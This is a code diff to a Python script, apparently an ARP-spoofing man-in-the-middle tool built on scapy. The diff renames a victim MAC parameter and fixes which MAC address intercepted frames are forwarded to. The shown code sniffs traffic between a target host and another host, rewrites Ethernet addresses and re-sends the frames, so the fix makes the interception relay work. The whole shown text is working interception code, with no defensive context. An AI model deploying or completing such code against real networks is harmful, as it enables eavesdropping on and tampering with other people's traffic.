@@ -43,7 +43,7 @@ def process_frame_from_target(own_mac_address: str, frame: Ether, host_mac: str)
     sendp(modified_frame, verbose=False)
 
 
-def process_frame_to_target(own_mac_address: str, frame: Ether, victim_mac: str) -> None:
+def process_frame_to_target(own_mac_address: str, frame: Ether, target_host_mac: str) -> None:
     """
     This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
     :param own_mac_address: The MAC address of the host that is running this script.
@@ -52,7 +52,7 @@ def process_frame_to_target(own_mac_address: str, frame: Ether, victim_mac: str)
     """
     modified_frame = frame.copy()
     modified_frame[Ether].src = own_mac_address
-    modified_frame[Ether].dst = victim_mac
+    modified_frame[Ether].dst = target_host_mac
     sendp(modified_frame, verbose=False)
 
 def active_spoofing(src_ip: str, dst_ip: str, dst_mac: str) -> None:
@@ -126,7 +126,7 @@ def main():
     sniff_from_target = AsyncSniffer(filter=f"ip src {target_host_ip} and ip dst {replace_host_ip} and not ether src {own_mac_address}",
                       prn=lambda frame: process_frame_from_target(own_mac_address, frame, replace_host_mac), store=0)
     sniff_to_target = AsyncSniffer(filter=f"ip src {replace_host_ip} and ip dst {target_host_ip} and not ether src {own_mac_address}",
-                      prn=lambda frame: process_frame_to_target(own_mac_address, frame, replace_host_mac), store=0)
+                      prn=lambda frame: process_frame_to_target(own_mac_address, frame, target_host_mac), store=0)
     sniff_from_target.start()
     sniff_to_target.start()
 
